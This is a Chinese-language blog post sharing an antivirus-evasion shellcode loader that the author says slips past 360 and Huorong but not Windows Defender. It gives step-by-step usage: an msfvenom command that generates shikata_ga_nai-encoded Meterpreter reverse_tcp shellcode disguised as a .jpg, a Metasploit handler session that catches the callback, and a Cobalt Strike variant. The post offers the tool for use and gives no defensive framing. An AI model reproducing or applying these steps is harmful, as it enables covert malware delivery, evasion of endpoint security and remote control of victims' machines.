更新时间：2022-01-19



# 【工具分享】免杀360&火绒的shellcode加载器

# 1. 免杀效果


该`shellcode`加载器目前可以过`360&火绒`，`Windows Defender`没戏。。。
​

代码和思路暂不开源！

你可以在我的GitHub上下载该工具：

如果你访问GitHub困难，你可以在乌鸦安全公众号后台直接回复关键字：加载器 下载！



方法： 生成`msf`或`cs`的`shellcode`原生格式，命名为`crowsec.jpg`（这个是写死的），将其和`crowsec_shelllcodeBypass.exe`（这个名字可以修改的）放在一个目录下，直接双击即可！
## 1.1 当前



| **杀软\免杀效果** | **虚拟机环境：Windows 10** | **虚拟机环境：Windows 7** | **虚拟机环境：Windows server 2019** | **最新测试时间** |
| --- | --- | --- | --- | --- |
| 联网Windows Defender最新版(关闭自动发送可疑样本) | ❌ | 未测 | ❌ | 2022.01.19 |
| 联网360最新版（其实测试没有什么意义） | ✅ | ✅ | ✅ | 2022.01.19 |
| 联网火绒最新版 | 未测 | ✅ | ✅ | 2022.01.19 |



## 1.2 半年前


这个数据已没有意义。

| **~~杀软\免杀效果~~** | **~~虚拟机环境：Windows 10~~** | **~~虚拟机环境：Windows 7~~** | **~~虚拟机环境：Windows server 2019~~** | **~~最新测试时间~~** |
| --- | --- | --- | --- | --- |
| ~~联网Windows Defender最新版(关闭自动发送可疑样本)~~ | ~~✅~~ | ~~未测~~ | ~~✅~~ | ~~2021.06.21~~ |
| ~~联网360最新版（~~~~其实测试没有什么意义~~~~）~~ | ~~未测~~ | ~~未测~~ | ~~未测~~ | ~~2021.06.21~~ |
| ~~联网火绒最新版~~ | ~~未测~~ | ~~✅~~ | ~~✅~~ | ~~2021.06.21~~ |



## 2.3 说明


这个`shellcode`加载器工具是我在`2021-06-21`号做的，优化之后VT查杀为`0/68`，一个月之后我再去检查，甚至到现在去检查，当前的VT查杀依旧为`0/68`。
​

`2021-06-21`是能过`火绒`、`360`、`Windows Defender(关闭自动发送可疑样本)`
​

前几天在测试的时候，发现过不了`Windows Defender`，今天稍微优化了一下，发现还是过不了`Windows Defender`，主要原因是识别了`msf`的部分特征！！！
​

鉴于目前已经有了其他的免杀方案，所以在这里就把工具分享出来（🐶），至少还能过`360`和`火绒`。（放出来之后，基本上几小时就没用了）。
​



![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642601558210-77264d08-585e-4214-86bf-f2ac13d84d07.png)


查询时间：`2022.01.19`
​

![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642601641740-37271f4b-227f-42e2-aca9-8f728e283c54.png)


# 3. 使用方法
# 3.1. msf上线


在这里使用msfvenon生成shellcode，为了好点的效果，这里使用`shikata_ga_nai` 编码器器对`shellcode`进行混淆编码，编码之后的`shellcode`并不是所有杀软都识别不出来，详情可以看我以前的文章：
xxxx
```
 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 7 -b '\x00'  lhost=10.211.55.2 lport=1234  -f raw -o crowsec.jpg
```


![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642602696391-0b17ed2f-a282-491a-a92a-1473b5213338.png)


使用msf进行监听：
​

![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642604110630-14245c70-16eb-4d0b-8cd1-d7528db5e163.png)
```python
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload  windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:1234
```
### 3.1.1 360
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642604510319-4ab109f8-01d4-484b-92fe-89972e00357b.png)
### 3.1.2 Windows Defender


被杀
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642606086645-b320419d-f848-4b95-b272-068940bc7fe2.png)


### 3.1.3 火绒
![image.png](https://cdn.nlark.com/yuque/0/2022/png/8378754/1642606183320-773dde9e-d3a4-4bf4-bede-a3639eeb3aa5.png)




## 3.2 Cobalt Strike上线


在这里只说思路，能够过`火绒`和`360`，但是不能过`Windows Defender`，同样的问题：特征出现在`shellcode`上面。


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333743849-3faa3f92-b9be-4d13-8639-4ef47d31d91e.png)


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333663432-aeef544c-00f5-46d0-afa5-be8eac02cbaf.png)
将文件保存为`crowsec.jpg`（下图是一个示例，主要是太累了，不想换了。。。）
![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333734629-94ba4bc1-8893-4882-a850-8e546fb212c4.png)
现将生成的bin文件修改为png文件，然后双击上线操作


![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333800699-980bd71e-f2ff-4383-b14e-7453e21db605.png)


但是这里可以发现，当前的`payload`已经被标记特征，直接被杀，但是免杀`360`和`火绒`是不影响的。
![image.png](https://cdn.nlark.com/yuque/0/2021/png/8378754/1624333824066-d215bf3b-bff0-413e-9791-8ed69dcecafe.png)
​

# 

